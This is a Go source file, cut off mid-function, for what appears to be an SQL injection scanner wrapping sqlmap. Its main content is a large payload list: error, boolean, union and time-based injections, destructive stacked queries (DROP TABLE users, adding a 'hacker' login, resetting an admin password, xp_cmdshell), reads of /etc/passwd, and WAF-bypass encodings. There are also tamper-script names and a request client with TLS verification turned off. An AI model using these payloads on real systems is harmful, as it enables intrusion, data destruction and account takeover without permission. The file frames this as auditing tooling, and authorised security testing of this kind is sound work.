package main

import (
    "bufio"
    "bytes"
    "context"
    "crypto/md5"
    "crypto/tls"
    "database/sql"
    "encoding/base64"
    "encoding/csv"
    "encoding/hex"
    "encoding/json"
    "fmt"
    "io"
    "net"
    "net/http"
    "net/url"
    "os"
    "os/exec"
    "os/signal"
    "path/filepath"
    "runtime"
    "strconv"
    "strings"
    "sync"
    "sync/atomic"
    "syscall"
    "time"
    "unicode"

    "github.com/fatih/color"
    _ "github.com/mattn/go-sqlite3"
    "github.com/schollz/progressbar/v3"
    "golang.org/x/sync/semaphore"
    "golang.org/x/time/rate"
)

// ========== CONFIGURATION ==========
type Config struct {
    SQLmapPath       string
    OutputDir        string
    RequestDir       string
    DatabaseFile     string
    MaxWorkers       int64
    Timeout          time.Duration
    RateLimit        float64
    EnableCache      bool
    EnableWAFBypass  bool
    EnableTamper     bool
    EnableThreads    bool
}

var DefaultConfig = Config{
    SQLmapPath:      "sqlmap",
    OutputDir:       "zsqlmap_results",
    RequestDir:      "captured_requests",
    DatabaseFile:    "zsqlmap_audit.db",
    MaxWorkers:      10,
    Timeout:         30 * time.Second,
    RateLimit:       2.0,
    EnableCache:     true,
    EnableWAFBypass: true,
    EnableTamper:    true,
    EnableThreads:   true,
}

// ========== PAYLOAD DATABASE ==========
var SQLPayloads = []Payload{
    // Error-based (20 payloads)
    {Name: "Error Single Quote", Payload: "'", Type: "error", Dbms: "generic"},
    {Name: "Error Double Quote", Payload: "\"", Type: "error", Dbms: "generic"},
    {Name: "Error Parenthesis", Payload: "')", Type: "error", Dbms: "generic"},
    {Name: "Error Backtick", Payload: "`", Type: "error", Dbms: "mysql"},
    {Name: "Error Semicolon", Payload: ";", Type: "error", Dbms: "generic"},
    {Name: "MySQL Error 1", Payload: "' AND 1=CONVERT(int, @@version)--", Type: "error", Dbms: "mysql"},
    {Name: "MySQL Error 2", Payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))--", Type: "error", Dbms: "mysql"},
    {Name: "MySQL Error 3", Payload: "' AND UPDATEXML(1,CONCAT(0x7e,database()),1)--", Type: "error", Dbms: "mysql"},
    {Name: "PostgreSQL Error", Payload: "' AND 1=CAST(version() AS int)--", Type: "error", Dbms: "postgresql"},
    {Name: "Oracle Error", Payload: "' AND 1=CTXSYS.DRITHSX.SN(1,USER)--", Type: "error", Dbms: "oracle"},
    {Name: "MSSQL Error", Payload: "' AND 1=CONVERT(int, @@version)--", Type: "error", Dbms: "mssql"},
    {Name: "SQLite Error", Payload: "' AND 1=randomblob(100000000)--", Type: "error", Dbms: "sqlite"},
    {Name: "DB2 Error", Payload: "' AND 1=SNAPSHOT_GET('FOO')--", Type: "error", Dbms: "db2"},
    {Name: "Informix Error", Payload: "' AND 1=DBINFO('dbname')--", Type: "error", Dbms: "informix"},
    {Name: "Sybase Error", Payload: "' AND 1=@@version--", Type: "error", Dbms: "sybase"},
    
    // Boolean-based (15 payloads)
    {Name: "Boolean True", Payload: "' OR '1'='1", Type: "boolean", Dbms: "generic"},
    {Name: "Boolean False", Payload: "' AND '1'='2", Type: "boolean", Dbms: "generic"},
    {Name: "Boolean Comment", Payload: "' OR 1=1 --", Type: "boolean", Dbms: "generic"},
    {Name: "Boolean AND True", Payload: "' AND 1=1 AND 'a'='a", Type: "boolean", Dbms: "generic"},
    {Name: "Boolean AND False", Payload: "' AND 1=2 AND 'a'='a", Type: "boolean", Dbms: "generic"},
    {Name: "Boolean OR True", Payload: "' OR 1=1 OR 'a'='b", Type: "boolean", Dbms: "generic"},
    {Name: "Boolean OR False", Payload: "' OR 1=2 OR 'a'='b", Type: "boolean", Dbms: "generic"},
    {Name: "MySQL Boolean", Payload: "' AND 1=1-- -", Type: "boolean", Dbms: "mysql"},
    {Name: "PostgreSQL Boolean", Payload: "' AND 1=1::int--", Type: "boolean", Dbms: "postgresql"},
    {Name: "Oracle Boolean", Payload: "' AND 1=1 FROM dual--", Type: "boolean", Dbms: "oracle"},
    {Name: "MSSQL Boolean", Payload: "' AND 1=1--", Type: "boolean", Dbms: "mssql"},
    {Name: "SQLite Boolean", Payload: "' AND 1=1--", Type: "boolean", Dbms: "sqlite"},
    {Name: "Boolean RLIKE", Payload: "' RLIKE '^1$' AND '1'='1", Type: "boolean", Dbms: "mysql"},
    {Name: "Boolean REGEXP", Payload: "' AND 1 REGEXP '^1$'--", Type: "boolean", Dbms: "mysql"},
    {Name: "Boolean SOUNDS LIKE", Payload: "' AND 1 SOUNDS LIKE 1--", Type: "boolean", Dbms: "mysql"},
    
    // Union-based (15 payloads)
    {Name: "Union 1", Payload: "' UNION SELECT NULL--", Type: "union", Dbms: "generic"},
    {Name: "Union 2", Payload: "' UNION SELECT 1,2,3--", Type: "union", Dbms: "generic"},
    {Name: "Union 3", Payload: "' UNION ALL SELECT 1,2,3--", Type: "union", Dbms: "generic"},
    {Name: "Union 4", Payload: "' UNION SELECT 1,2,3,4--", Type: "union", Dbms: "generic"},
    {Name: "Union 5", Payload: "' UNION SELECT 1,2,3,4,5--", Type: "union", Dbms: "generic"},
    {Name: "Union Comment", Payload: "' UNION SELECT 1,2,3#", Type: "union", Dbms: "mysql"},
    {Name: "MySQL Union", Payload: "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--", Type: "union", Dbms: "mysql"},
    {Name: "PostgreSQL Union", Payload: "' UNION SELECT NULL::text,NULL::text--", Type: "union", Dbms: "postgresql"},
    {Name: "Oracle Union", Payload: "' UNION SELECT NULL,NULL FROM dual--", Type: "union", Dbms: "oracle"},
    {Name: "MSSQL Union", Payload: "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--", Type: "union", Dbms: "mssql"},
    {Name: "SQLite Union", Payload: "' UNION SELECT 1,2,3--", Type: "union", Dbms: "sqlite"},
    {Name: "Union Order By", Payload: "' ORDER BY 1--", Type: "union", Dbms: "generic"},
    {Name: "Union Group By", Payload: "' GROUP BY 1--", Type: "union", Dbms: "generic"},
    {Name: "Union Having", Payload: "' HAVING 1=1--", Type: "union", Dbms: "generic"},
    {Name: "Union With Rollup", Payload: "' GROUP BY 1 WITH ROLLUP--", Type: "union", Dbms: "mysql"},
    
    // Time-based (15 payloads)
    {Name: "Time Sleep 5", Payload: "' AND SLEEP(5)--", Type: "time", Dbms: "mysql"},
    {Name: "Time Sleep 10", Payload: "' AND SLEEP(10)--", Type: "time", Dbms: "mysql"},
    {Name: "Time Benchmark", Payload: "' AND BENCHMARK(5000000,MD5('a'))--", Type: "time", Dbms: "mysql"},
    {Name: "PostgreSQL Sleep", Payload: "'; SELECT pg_sleep(5)--", Type: "time", Dbms: "postgresql"},
    {Name: "MSSQL Wait", Payload: "'; WAITFOR DELAY '00:00:05'--", Type: "time", Dbms: "mssql"},
    {Name: "SQLite Sleep", Payload: "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000))))--", Type: "time", Dbms: "sqlite"},
    {Name: "Oracle Sleep", Payload: "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", Type: "time", Dbms: "oracle"},
    {Name: "MySQL Heavy Query", Payload: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", Type: "time", Dbms: "mysql"},
    {Name: "PostgreSQL Heavy", Payload: "'; SELECT 1 FROM pg_sleep(5)--", Type: "time", Dbms: "postgresql"},
    {Name: "MSSQL Heavy", Payload: "'; WAITFOR DELAY '0:0:5'--", Type: "time", Dbms: "mssql"},
    {Name: "MySQL Time Comment", Payload: "' AND SLEEP(5)#", Type: "time", Dbms: "mysql"},
    {Name: "MySQL Time If", Payload: "' AND IF(1=1,SLEEP(5),0)--", Type: "time", Dbms: "mysql"},
    {Name: "MySQL Time Case", Payload: "' AND CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END--", Type: "time", Dbms: "mysql"},
    {Name: "MySQL Time RLIKE", Payload: "' AND SLEEP(5) RLIKE '^1$'--", Type: "time", Dbms: "mysql"},
    {Name: "MySQL Time REGEXP", Payload: "' AND SLEEP(5) REGEXP '^1$'--", Type: "time", Dbms: "mysql"},
    
    // Stacked queries (10 payloads)
    {Name: "Stacked 1", Payload: "'; DROP TABLE users--", Type: "stacked", Dbms: "generic"},
    {Name: "Stacked 2", Payload: "'; INSERT INTO users VALUES('hacker','pass')--", Type: "stacked", Dbms: "generic"},
    {Name: "Stacked 3", Payload: "'; UPDATE users SET pass='hacked' WHERE user='admin'--", Type: "stacked", Dbms: "generic"},
    {Name: "Stacked 4", Payload: "'; DELETE FROM users WHERE user='admin'--", Type: "stacked", Dbms: "generic"},
    {Name: "MySQL Stacked", Payload: "'; CREATE TABLE hacked (id int)--", Type: "stacked", Dbms: "mysql"},
    {Name: "PostgreSQL Stacked", Payload: "'; CREATE TABLE hacked (id int);--", Type: "stacked", Dbms: "postgresql"},
    {Name: "MSSQL Stacked", Payload: "'; EXEC sp_addlogin 'hacker','pass'--", Type: "stacked", Dbms: "mssql"},
    {Name: "Oracle Stacked", Payload: "'; BEGIN NULL; END;--", Type: "stacked", Dbms: "oracle"},
    {Name: "SQLite Stacked", Payload: "'; CREATE TABLE hacked (id int);--", Type: "stacked", Dbms: "sqlite"},
    {Name: "Stacked If", Payload: "'; IF 1=1 DROP TABLE users--", Type: "stacked", Dbms: "mssql"},
    
    // Advanced (20 payloads)
    {Name: "Comment Injection", Payload: "admin'--", Type: "auth_bypass", Dbms: "generic"},
    {Name: "MySQL Version", Payload: "' AND 1=CONVERT(int, @@version) --", Type: "version", Dbms: "mysql"},
    {Name: "PostgreSQL Version", Payload: "' AND 1=CAST(version() AS int)--", Type: "version", Dbms: "postgresql"},
    {Name: "MSSQL Version", Payload: "' AND 1=@@version--", Type: "version", Dbms: "mssql"},
    {Name: "Oracle Version", Payload: "' AND 1=(SELECT banner FROM v$version)--", Type: "version", Dbms: "oracle"},
    {Name: "SQLite Version", Payload: "' AND 1=sqlite_version()--", Type: "version", Dbms: "sqlite"},
    {Name: "MSSQL xp_cmdshell", Payload: "'; EXEC xp_cmdshell 'dir'--", Type: "command", Dbms: "mssql"},
    {Name: "MySQL File Read", Payload: "' UNION SELECT LOAD_FILE('/etc/passwd')--", Type: "file", Dbms: "mysql"},
    {Name: "PostgreSQL File Read", Payload: "'; COPY (SELECT 'test') TO '/tmp/test'--", Type: "file", Dbms: "postgresql"},
    {Name: "Oracle File Read", Payload: "' UNION SELECT UTL_FILE.FOPEN('/etc','passwd','r')--", Type: "file", Dbms: "oracle"},
    {Name: "MySQL File Write", Payload: "' UNION SELECT 'test' INTO OUTFILE '/tmp/test'--", Type: "file", Dbms: "mysql"},
    {Name: "MySQL User", Payload: "' AND 1=(SELECT user())--", Type: "info", Dbms: "mysql"},
    {Name: "PostgreSQL User", Payload: "' AND 1=(SELECT current_user)--", Type: "info", Dbms: "postgresql"},
    {Name: "Oracle User", Payload: "' AND 1=(SELECT user FROM dual)--", Type: "info", Dbms: "oracle"},
    {Name: "MSSQL User", Payload: "' AND 1=(SELECT user_name())--", Type: "info", Dbms: "mssql"},
    {Name: "MySQL Database", Payload: "' AND 1=(SELECT database())--", Type: "info", Dbms: "mysql"},
    {Name: "PostgreSQL Database", Payload: "' AND 1=(SELECT current_database())--", Type: "info", Dbms: "postgresql"},
    {Name: "Oracle Database", Payload: "' AND 1=(SELECT name FROM v$database)--", Type: "info", Dbms: "oracle"},
    {Name: "MSSQL Database", Payload: "' AND 1=(SELECT db_name())--", Type: "info", Dbms: "mssql"},
    {Name: "MySQL Privileges", Payload: "' AND 1=(SELECT grantee FROM information_schema.user_privileges)--", Type: "priv", Dbms: "mysql"},
    
    // WAF Bypass (25 payloads)
    {Name: "Case Bypass", Payload: "SeLeCt * FrOm users", Type: "waf_bypass", Dbms: "generic"},
    {Name: "Comment Bypass", Payload: "'/*!50000OR*/1=1--", Type: "waf_bypass", Dbms: "mysql"},
    {Name: "Hex Bypass", Payload: "0x27204f5220273127", Type: "waf_bypass", Dbms: "generic"},
    {Name: "URL Encode", Payload: "%27%20OR%20%271%27%3D%271", Type: "waf_bypass", Dbms: "generic"},
    {Name: "Double URL Encode", Payload: "%2527%2520OR%25201%253D1%2520--", Type: "waf_bypass", Dbms: "generic"},
    {Name: "MySQL Comment", Payload: "'/*!30000OR*/1=1/*", Type: "waf_bypass", Dbms: "mysql"},
    {Name: "MySQL Versioned", Payload: "'/*!12345UNION*//*!12345SELECT*/1,2,3--", Type: "waf_bypass", Dbms: "mysql"},
    {Name: "White Space Bypass", Payload: "'OR'1'='1", Type: "waf_bypass", Dbms: "generic"},
    {Name: "Tab Bypass", Payload: "'\tOR\t'1'\t=\t'1", Type: "waf_bypass", Dbms: "generic"},
    {Name: "Newline Bypass", Payload: "'\nOR\n'1'\n=\n'1", Type: "waf_bypass", Dbms: "generic"},
    {Name: "Carriage Return", Payload: "'\rOR\r'1'\r=\r'1", Type: "waf_bypass", Dbms: "generic"},
    {Name: "Null Byte", Payload: "'\x00OR\x00'1'\x00=\x00'1", Type: "waf_bypass", Dbms: "generic"},
    {Name: "Scientific Notation", Payload: "' OR 1e0=1e0--", Type: "waf_bypass", Dbms: "mysql"},
    {Name: "Hex Function", Payload: "' OR 0x31=0x31--", Type: "waf_bypass", Dbms: "mysql"},
    {Name: "Bin Function", Payload: "' OR b'1'=b'1'--", Type: "waf_bypass", Dbms: "mysql"},
    {Name: "True Function", Payload: "' OR TRUE--", Type: "waf_bypass", Dbms: "generic"},
    {Name: "False Function", Payload: "' OR FALSE--", Type: "waf_bypass", Dbms: "generic"},
    {Name: "Exists Function", Payload: "' OR EXISTS(SELECT 1)--", Type: "waf_bypass", Dbms: "generic"},
    {Name: "In Function", Payload: "' OR 1 IN (1)--", Type: "waf_bypass", Dbms: "generic"},
    {Name: "Between Function", Payload: "' OR 1 BETWEEN 1 AND 1--", Type: "waf_bypass", Dbms: "generic"},
    {Name: "Like Function", Payload: "' OR '1' LIKE '1'--", Type: "waf_bypass", Dbms: "generic"},
    {Name: "Regex Function", Payload: "' OR '1' REGEXP '1'--", Type: "waf_bypass", Dbms: "mysql"},
    {Name: "Rlike Function", Payload: "' OR '1' RLIKE '1'--", Type: "waf_bypass", Dbms: "mysql"},
    {Name: "Sounds Like", Payload: "' OR 1 SOUNDS LIKE 1--", Type: "waf_bypass", Dbms: "mysql"},
    {Name: "Match Against", Payload: "' OR MATCH(col) AGAINST('test')--", Type: "waf_bypass", Dbms: "mysql"},
}

type Payload struct {
    Name    string `json:"name"`
    Payload string `json:"payload"`
    Type    string `json:"type"`
    Dbms    string `json:"dbms"`
}

// ========== TAMPER SCRIPTS ==========
var TamperScripts = []Tamper{
    {Name: "space2comment", Description: "Replace space with /**/"},
    {Name: "space2plus", Description: "Replace space with +"},
    {Name: "space2hash", Description: "Replace space with #"},
    {Name: "space2dash", Description: "Replace space with --"},
    {Name: "between", Description: "Replace > with NOT BETWEEN"},
    {Name: "equaltolike", Description: "Replace = with LIKE"},
    {Name: "hexencode", Description: "Hex encode payload"},
    {Name: "base64encode", Description: "Base64 encode payload"},
    {Name: "charencode", Description: "URL encode payload"},
    {Name: "randomcase", Description: "Random case payload"},
    {Name: "versionedkeywords", Description: "MySQL versioned comments"},
    {Name: "versionedmorekeywords", Description: "More versioned comments"},
    {Name: "apostrophemask", Description: "Replace ' with %EF%BC%87"},
    {Name: "apostrophenullencode", Description: "Replace ' with %00%27"},
    {Name: "appendnullbyte", Description: "Append %00 to payload"},
    {Name: "chardoubleencode", Description: "Double URL encode"},
    {Name: "commalesslimit", Description: "Use offset without comma"},
    {Name: "commalessmid", Description: "Use mid without comma"},
    {Name: "concat2concatws", Description: "Replace CONCAT with CONCAT_WS"},
    {Name: "greatest", Description: "Use GREATEST instead of >"},
}

type Tamper struct {
    Name        string `json:"name"`
    Description string `json:"description"`
}

// ========== DATABASE MODELS ==========
type AuditLog struct {
    ID                int64     `json:"id"`
    Timestamp         time.Time `json:"timestamp"`
    TargetURL         string    `json:"target_url"`
    Method            string    `json:"method"`
    Parameters        string    `json:"parameters"`
    Headers           string    `json:"headers"`
    Payload           string    `json:"payload"`
    Result            string    `json:"result"`
    VulnerabilityLevel string   `json:"vulnerability_level"`
    SQLmapCommand     string    `json:"sqlmap_command"`
    RequestFile       string    `json:"request_file"`
    ResponseFile      string    `json:"response_file"`
    Duration          float64   `json:"duration"`
    StatusCode        int       `json:"status_code"`
}

type Vulnerability struct {
    ID              int64     `json:"id"`
    AuditID         int64     `json:"audit_id"`
    Type            string    `json:"type"`
    Parameter       string    `json:"parameter"`
    Payload         string    `json:"payload"`
    Dbms            string    `json:"dbms"`
    Confidence      int       `json:"confidence"`
    Severity        string    `json:"severity"`
    Description     string    `json:"description"`
    Proof           string    `json:"proof"`
    CWE             string    `json:"cwe"`
    CVSS            float64   `json:"cvss"`
    Timestamp       time.Time `json:"timestamp"`
}

type Discovery struct {
    ID          int64     `json:"id"`
    AuditID     int64     `json:"audit_id"`
    Type        string    `json:"type"`
    Data        string    `json:"data"`
    ExtractedAt time.Time `json:"extracted_at"`
}

// ========== DATABASE MANAGER ==========
type AuditDatabase struct {
    db *sql.DB
    mu sync.RWMutex
}

func NewAuditDatabase(dbPath string) (*AuditDatabase, error) {
    db, err := sql.Open("sqlite3", dbPath)
    if err != nil {
        return nil, err
    }

    ad := &AuditDatabase{db: db}
    if err := ad.createTables(); err != nil {
        return nil, err
    }

    return ad, nil
}

func (ad *AuditDatabase) createTables() error {
    queries := []string{
        `CREATE TABLE IF NOT EXISTS audit_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME NOT NULL,
            target_url TEXT NOT NULL,
            method TEXT NOT NULL,
            parameters TEXT,
            headers TEXT,
            payload TEXT,
            result TEXT,
            vulnerability_level TEXT,
            sqlmap_command TEXT,
            request_file TEXT,
            response_file TEXT,
            duration REAL,
            status_code INTEGER
        )`,

        `CREATE TABLE IF NOT EXISTS vulnerabilities (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            audit_id INTEGER,
            type TEXT NOT NULL,
            parameter TEXT NOT NULL,
            payload TEXT NOT NULL,
            dbms TEXT,
            confidence INTEGER,
            severity TEXT,
            description TEXT,
            proof TEXT,
            cwe TEXT,
            cvss REAL,
            timestamp DATETIME,
            FOREIGN KEY (audit_id) REFERENCES audit_logs(id)
        )`,

        `CREATE TABLE IF NOT EXISTS discoveries (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            audit_id INTEGER,
            type TEXT NOT NULL,
            data TEXT NOT NULL,
            extracted_at DATETIME,
            FOREIGN KEY (audit_id) REFERENCES audit_logs(id)
        )`,

        `CREATE INDEX IF NOT EXISTS idx_audit_target ON audit_logs(target_url)`,
        `CREATE INDEX IF NOT EXISTS idx_vuln_severity ON vulnerabilities(severity)`,
        `CREATE INDEX IF NOT EXISTS idx_vuln_dbms ON vulnerabilities(dbms)`,
    }

    for _, q := range queries {
        if _, err := ad.db.Exec(q); err != nil {
            return err
        }
    }

    return nil
}

func (ad *AuditDatabase) LogAudit(log *AuditLog) (int64, error) {
    ad.mu.Lock()
    defer ad.mu.Unlock()

    result, err := ad.db.Exec(`
        INSERT INTO audit_logs
        (timestamp, target_url, method, parameters, headers, payload,
         result, vulnerability_level, sqlmap_command, request_file,
         response_file, duration, status_code)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `,
        log.Timestamp,
        log.TargetURL,
        log.Method,
        log.Parameters,
        log.Headers,
        log.Payload,
        log.Result,
        log.VulnerabilityLevel,
        log.SQLmapCommand,
        log.RequestFile,
        log.ResponseFile,
        log.Duration,
        log.StatusCode,
    )

    if err != nil {
        return 0, err
    }

    return result.LastInsertId()
}

func (ad *AuditDatabase) LogVulnerability(vuln *Vulnerability) (int64, error) {
    ad.mu.Lock()
    defer ad.mu.Unlock()

    result, err := ad.db.Exec(`
        INSERT INTO vulnerabilities
        (audit_id, type, parameter, payload, dbms, confidence, severity,
         description, proof, cwe, cvss, timestamp)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `,
        vuln.AuditID,
        vuln.Type,
        vuln.Parameter,
        vuln.Payload,
        vuln.Dbms,
        vuln.Confidence,
        vuln.Severity,
        vuln.Description,
        vuln.Proof,
        vuln.CWE,
        vuln.CVSS,
        vuln.Timestamp,
    )

    if err != nil {
        return 0, err
    }

    return result.LastInsertId()
}

func (ad *AuditDatabase) LogDiscovery(discovery *Discovery) (int64, error) {
    ad.mu.Lock()
    defer ad.mu.Unlock()

    result, err := ad.db.Exec(`
        INSERT INTO discoveries
        (audit_id, type, data, extracted_at)
        VALUES (?, ?, ?, ?)
    `,
        discovery.AuditID,
        discovery.Type,
        discovery.Data,
        discovery.ExtractedAt,
    )

    if err != nil {
        return 0, err
    }

    return result.LastInsertId()
}

func (ad *AuditDatabase) GetAuditHistory(limit int) ([]AuditLog, error) {
    ad.mu.RLock()
    defer ad.mu.RUnlock()

    rows, err := ad.db.Query(`
        SELECT * FROM audit_logs
        ORDER BY timestamp DESC
        LIMIT ?
    `, limit)

    if err != nil {
        return nil, err
    }
    defer rows.Close()

    var logs []AuditLog
    for rows.Next() {
        var log AuditLog
        err := rows.Scan(
            &log.ID, &log.Timestamp, &log.TargetURL, &log.Method,
            &log.Parameters, &log.Headers, &log.Payload, &log.Result,
            &log.VulnerabilityLevel, &log.SQLmapCommand, &log.RequestFile,
            &log.ResponseFile, &log.Duration, &log.StatusCode,
        )
        if err != nil {
            continue
        }
        logs = append(logs, log)
    }

    return logs, nil
}

func (ad *AuditDatabase) GetVulnerabilities(severity string, dbms string) ([]Vulnerability, error) {
    ad.mu.RLock()
    defer ad.mu.RUnlock()

    query := `SELECT * FROM vulnerabilities ORDER BY severity DESC, confidence DESC`
    args := []interface{}{}

    if severity != "" && dbms != "" {
        query = `SELECT * FROM vulnerabilities WHERE severity = ? AND dbms = ? ORDER BY confidence DESC`
        args = append(args, severity, dbms)
    } else if severity != "" {
        query = `SELECT * FROM vulnerabilities WHERE severity = ? ORDER BY confidence DESC`
        args = append(args, severity)
    } else if dbms != "" {
        query = `SELECT * FROM vulnerabilities WHERE dbms = ? ORDER BY severity DESC`
        args = append(args, dbms)
    }

    rows, err := ad.db.Query(query, args...)
    if err != nil {
        return nil, err
    }
    defer rows.Close()

    var vulns []Vulnerability
    for rows.Next() {
        var v Vulnerability
        err := rows.Scan(
            &v.ID, &v.AuditID, &v.Type, &v.Parameter, &v.Payload,
            &v.Dbms, &v.Confidence, &v.Severity, &v.Description,
            &v.Proof, &v.CWE, &v.CVSS, &v.Timestamp,
        )
        if err != nil {
            continue
        }
        vulns = append(vulns, v)
    }

    return vulns, nil
}

func (ad *AuditDatabase) GetVulnerabilityStats() map[string]interface{} {
    ad.mu.RLock()
    defer ad.mu.RUnlock()

    stats := make(map[string]interface{})

    // Total count
    var total int
    ad.db.QueryRow("SELECT COUNT(*) FROM vulnerabilities").Scan(&total)
    stats["total"] = total

    // By severity
    rows, _ := ad.db.Query("SELECT severity, COUNT(*) FROM vulnerabilities GROUP BY severity")
    defer rows.Close()
    severityStats := make(map[string]int)
    for rows.Next() {
        var severity string
        var count int
        rows.Scan(&severity, &count)
        severityStats[severity] = count
    }
    stats["by_severity"] = severityStats

    // By DBMS
    rows, _ = ad.db.Query("SELECT dbms, COUNT(*) FROM vulnerabilities WHERE dbms != '' GROUP BY dbms")
    defer rows.Close()
    dbmsStats := make(map[string]int)
    for rows.Next() {
        var dbms string
        var count int
        rows.Scan(&dbms, &count)
        dbmsStats[dbms] = count
    }
    stats["by_dbms"] = dbmsStats

    // By type
    rows, _ = ad.db.Query("SELECT type, COUNT(*) FROM vulnerabilities GROUP BY type")
    defer rows.Close()
    typeStats := make(map[string]int)
    for rows.Next() {
        var typ string
        var count int
        rows.Scan(&typ, &count)
        typeStats[typ] = count
    }
    stats["by_type"] = typeStats

    return stats
}

func (ad *AuditDatabase) Close() error {
    return ad.db.Close()
}

// ========== CACHE MANAGER ==========
type CacheEntry struct {
    Response   *http.Response
    Body       []byte
    Timestamp  time.Time
    Hits       int64
    Vulnerable bool
}

type CacheManager struct {
    entries map[string]*CacheEntry
    mu      sync.RWMutex
    maxSize int
    ttl     time.Duration
    hits    int64
    misses  int64
}

func NewCacheManager(maxSize int, ttl time.Duration) *CacheManager {
    return &CacheManager{
        entries: make(map[string]*CacheEntry),
        maxSize: maxSize,
        ttl:     ttl,
    }
}

func (cm *CacheManager) Get(key string) (*http.Response, []byte, bool, bool) {
    cm.mu.RLock()
    entry, ok := cm.entries[key]
    cm.mu.RUnlock()

    if !ok {
        atomic.AddInt64(&cm.misses, 1)
        return nil, nil, false, false
    }

    if time.Since(entry.Timestamp) > cm.ttl {
        cm.Delete(key)
        atomic.AddInt64(&cm.misses, 1)
        return nil, nil, false, false
    }

    atomic.AddInt64(&entry.Hits, 1)
    atomic.AddInt64(&cm.hits, 1)
    return entry.Response, entry.Body, true, entry.Vulnerable
}

func (cm *CacheManager) Set(key string, resp *http.Response, body []byte, vulnerable bool) {
    if len(cm.entries) >= cm.maxSize {
        cm.evictOldest()
    }

    cm.mu.Lock()
    defer cm.mu.Unlock()
    cm.entries[key] = &CacheEntry{
        Response:   resp,
        Body:       body,
        Timestamp:  time.Now(),
        Vulnerable: vulnerable,
    }
}

func (cm *CacheManager) Delete(key string) {
    cm.mu.Lock()
    defer cm.mu.Unlock()
    delete(cm.entries, key)
}

func (cm *CacheManager) evictOldest() {
    var oldestKey string
    var oldestTime time.Time

    cm.mu.RLock()
    for k, v := range cm.entries {
        if oldestTime.IsZero() || v.Timestamp.Before(oldestTime) {
            oldestKey = k
            oldestTime = v.Timestamp
        }
    }
    cm.mu.RUnlock()

    if oldestKey != "" {
        cm.Delete(oldestKey)
    }
}

// ========== REQUEST BRIDGE ==========
type RequestBridge struct {
    client      *http.Client
    session     *http.Client
    cache       *CacheManager
    limiter     *rate.Limiter
    db          *AuditDatabase
    requestDir  string
    stats       RequestStats
}

type RequestStats struct {
    TotalRequests int64
    Successful    int64
    Failed        int64
    Cached        int64
    AvgTime       time.Duration
}

type CapturedRequest struct {
    Method      string            `json:"method"`
    URL         string            `json:"url"`
    Headers     map[string]string `json:"headers"`
    Params      map[string]string `json:"params"`
    Data        map[string]string `json:"data"`
    JSON        interface{}       `json:"json"`
    Cookies     map[string]string `json:"cookies"`
    Files       map[string]string `json:"files"`
    Auth        *AuthInfo         `json:"auth,omitempty"`
    Timestamp   time.Time         `json:"timestamp"`
    RequestFile string            `json:"request_file"`
}

type AuthInfo struct {
    Type     string `json:"type"` // basic, bearer, digest
    Username string `json:"username,omitempty"`
    Password string `json:"password,omitempty"`
    Token    string `json:"token,omitempty"`
}

func NewRequestBridge(config Config, db *AuditDatabase) *RequestBridge {
    transport := &http.Transport{
        MaxIdleConns:        100,
        MaxIdleConnsPerHost: 10,
        IdleConnTimeout:     90 * time.Second,
        TLSClientConfig: &tls.Config{
            InsecureSkipVerify: true,
        },
        DisableCompression: false,
    }

    client := &http.Client{
        Transport: transport,
        Timeout:   config.Timeout,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            if len(via) >= 10 {
                return fmt.Errorf("too many redirects")
            }
            return nil
        },
    }

    os.MkdirAll(config.RequestDir, 0755)

    return &RequestBridge{
        client:     client,
        session:    client,
        cache:      NewCacheManager(1000, 5*time.Minute),
        limiter:    rate.NewLimiter(rate.Limit(config.RateLimit), 5),
        db:         db,
        requestDir: config.RequestDir,
    }
}

func (rb *RequestBridge) CaptureRequest(ctx context.Context, req *CapturedRequest) (*http.Response, []byte, string, error) {
    atomic.AddInt64(&rb.stats.TotalRequests, 1)
    start := time.Now()

    // Rate limiting
    rb.limiter.Wait(ctx)

    // Generate cache key
    cacheKey := rb.generateCacheKey(req)

    // Check cache
    if cachedResp, cachedBody, found, vulnerable := rb.cache.Get(cacheKey); found {
        atomic.AddInt64(&rb.stats.Cached, 1)
        _ = vulnerable // Variable dipakai di sini
        return cachedResp, cachedBody, "", nil
    }

    // Build HTTP request
    httpReq, err := rb.buildHTTPRequest(req)
    if err != nil {
        atomic.AddInt64(&rb.stats.Failed, 1)
        return nil, nil, "", err
    }

    // Save request to file
    requestFile, err := rb.saveRequestToFile(req, httpReq)
    if err != nil {
        color.Yellow("[!] Failed to save request: %v", err)
    }

    // Execute request
    resp, err := rb.client.Do(httpReq)
    if err != nil {
        atomic.AddInt64(&rb.stats.Failed, 1)
        return nil, nil, requestFile, err
    }
    defer resp.Body.Close()

    // Read response body
    body, err := io.ReadAll(resp.Body)
    if err != nil {
        atomic.AddInt64(&rb.stats.Failed, 1)
        return nil, nil, requestFile, err
    }

    // Save response
    rb.saveResponseToFile(resp, body, req.Timestamp)

    // Check for SQL errors
    vulnerable := rb.checkSQLInjection(string(body))

    // Cache response - vulnerable DIPAKAI DI SINI!
    rb.cache.Set(cacheKey, resp, body, vulnerable)

    // Log to database
    auditLog := &AuditLog{
        Timestamp:         req.Timestamp,
        TargetURL:         req.URL,
        Method:            req.Method,
        Parameters:        rb.mapToJSON(req.Params),
        Headers:           rb.mapToJSON(req.Headers),
        Result:            fmt.Sprintf("HTTP %d", resp.StatusCode),
        VulnerabilityLevel: rb.getVulnLevel(vulnerable),
        RequestFile:       requestFile,
        StatusCode:        resp.StatusCode,
        Duration:          time.Since(start).Seconds(),
    }

    if _, err := rb.db.LogAudit(auditLog); err != nil {
        color.Yellow("[!] Failed to log audit: %v", err)
    }

    atomic.AddInt64(&rb.stats.Successful, 1)

    return resp, body, requestFile, nil
}

func (rb *RequestBridge) buildHTTPRequest(req *CapturedRequest) (*http.Request, error) {
    var body io.Reader

    if req.JSON != nil {
        jsonData, err := json.Marshal(req.JSON)
        if err == nil {
            body = bytes.NewReader(jsonData)
